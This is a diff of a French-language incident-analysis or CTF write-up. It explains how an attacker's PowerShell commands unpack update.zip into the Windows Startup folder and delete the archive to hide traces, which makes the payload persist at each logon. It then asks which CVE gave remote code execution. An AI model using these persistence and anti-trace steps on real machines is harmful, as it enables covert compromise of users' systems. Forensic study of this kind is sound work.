@@ -86,8 +86,6 @@ $app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\
 | 4 | `Expand-Archive .\update.zip -DestinationPath .` | Décompresse l'archive directement dans le dossier Démarrage. |
 | 5 | `rm update.zip` | Supprime l'archive pour laisser moins de traces. |
 
-## Résultat
-
 La charge contenue dans `update.zip` s'exécutera **à chaque connexion de l'utilisateur** : c'est un mécanisme de **persistance**.
 
 6 - Quel est le numéro CVE de l'exploit utilisé par l'attaquant pour parvenir à une exécution de code à distance ?
